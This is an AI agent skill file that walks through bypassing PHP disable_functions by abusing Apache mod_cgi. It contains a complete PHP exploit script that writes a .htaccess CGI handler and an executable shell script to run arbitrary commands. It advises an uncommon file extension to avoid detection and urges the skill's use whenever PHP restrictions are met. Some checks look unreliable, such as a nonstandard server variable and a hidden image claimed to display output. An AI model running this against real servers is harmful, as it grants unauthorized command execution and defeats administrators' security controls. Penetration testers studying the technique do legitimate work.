---
name: php-mod-cgi-bypass
description: Bypass PHP disable_functions restrictions using mod_cgi CGI handler. Use this skill when testing PHP applications for command execution vulnerabilities, when PHP functions like system/exec are disabled but you have write access and mod_cgi is enabled, or when you need to execute arbitrary commands in restricted PHP environments. Make sure to use this skill whenever you're doing authorized security testing on PHP applications with disabled functions, or when you encounter PHP restrictions during penetration testing.
---

# PHP mod_cgi disable_functions Bypass

This skill helps security professionals test for and bypass PHP `disable_functions` restrictions using the mod_cgi CGI handler technique.

## When to Use

Use this skill when:
- You're conducting authorized security testing on PHP applications
- PHP functions like `system()`, `exec()`, `shell_exec()` are disabled
- You have write access to the web directory
- You suspect mod_cgi might be enabled
- You need to execute arbitrary commands in a restricted PHP environment

## Prerequisites

This technique requires ALL of the following:
1. **mod_cgi enabled** - Apache's mod_cgi module must be active
2. **Writeable directory** - You must be able to write files to the current directory
3. **htaccess enabled** - .htaccess files must be processed by Apache

## How It Works

The technique exploits mod_cgi to execute arbitrary commands by:
1. Creating a .htaccess file that registers a custom CGI handler
2. Writing a shell script with the CGI handler extension
3. The shell script outputs proper HTTP headers and executes the command
4. Accessing the script triggers command execution

## Implementation

### Step 1: Check Prerequisites

First, verify all conditions are met:

```php
<?php
$modcgi = in_array('mod_cgi', apache_get_modules());
$writable = is_writable('.');
$htaccess = !empty($_SERVER['HTACCESS']);

echo "Mod-CGI enabled: " . ($modcgi ? "Yes" : "No") . "<br>";
echo "Directory writable: " . ($writable ? "Yes" : "No") . "<br>";
echo "htaccess working: " . ($htaccess ? "Yes" : "No") . "<br>";

if (!($modcgi && $writable && $htaccess)) {
    die("Error: All prerequisites must be met for this technique to work!");
}
?>
```

### Step 2: Create .htaccess

Configure the CGI handler with a custom extension:

```
Options +ExecCGI
AddHandler cgi-script .dizzle
```

**Note:** Use an uncommon extension like `.dizzle` to avoid detection and conflicts with existing handlers.

### Step 3: Create Shell Script

Write the executable script with proper CGI headers:

```bash
#!/bin/bash
echo -ne "Content-Type: text/html\n\n"
# Your command here
```

**Important:** The `Content-Type` header is required. Without it, Apache will throw a 500 error when there's output.

### Step 4: Execute

Access the script via browser to trigger command execution:

```
http://target/path/to/shell.dizzle
```

## Complete Exploit Script

Here's a complete PHP script that automates the entire process:

```php
<?php
// mod_cgi disable_functions bypass
// Requirements: mod_cgi enabled, writable dir, htaccess enabled

$cmd = "id"; // Replace with your command
$shellfile = "#!/bin/bash\n";
$shellfile .= "echo -ne \"Content-Type: text/html\\n\\n\"\n";
$shellfile .= "$cmd\n";

// Check prerequisites
$modcgi = in_array('mod_cgi', apache_get_modules());
$writable = is_writable('.');
$htaccess = !empty($_SERVER['HTACCESS']);

echo "<h2>Prerequisites Check</h2>";
echo "Mod-CGI enabled: " . ($modcgi ? "Yes" : "No") . "<br>";
echo "Directory writable: " . ($writable ? "Yes" : "No") . "<br>";
echo "htaccess working: " . ($htaccess ? "Yes" : "No") . "<br>";

if (!($modcgi && $writable && $htaccess)) {
    die("<h2>Error</h2>All prerequisites must be met for this technique to work!");
}

// Backup existing .htaccess
if (file_exists('.htaccess')) {
    copy('.htaccess', '.htaccess.bak');
    echo "<p>Backed up .htaccess to .htaccess.bak</p>";
}

// Write .htaccess configuration
file_put_contents('.htaccess', "Options +ExecCGI\nAddHandler cgi-script .dizzle\n");
echo "<p>Created .htaccess with CGI handler</p>";

// Write shell script
file_put_contents('shell.dizzle', $shellfile);
chmod('shell.dizzle', 0777);
echo "<p>Created shell.dizzle with execute permissions</p>";

// Execute the script
echo "<p>Executing command. Check output below:</p>";
echo "<img src='shell.dizzle' style='display:none;'>";
?>
```

## Testing Checklist

Before attempting this technique, verify:

- [ ] You have explicit authorization to test the target
- [ ] mod_cgi is enabled (`apache_get_modules()` contains 'mod_cgi')
- [ ] Current directory is writable (`is_writable('.')` returns true)
- [ ] .htaccess files are processed (check via test file)
- [ ] You understand the legal implications

## Limitations

- Requires specific Apache configuration (mod_cgi + ExecCGI)
- Modern servers often disable mod_cgi or restrict CGI execution
- May not work with PHP-FPM or other SAPI configurations
- Requires write access to web directory
- May be detected by WAFs or security monitoring

## References

- [Original technique](http://blog.safebuff.com/2016/05/06/disable-functions-bypass/)
- Apache mod_cgi documentation
- CGI specification

## Security Note

**This skill is for authorized security testing only.** Always obtain proper authorization before testing any system. Unauthorized access to computer systems is illegal and unethical.
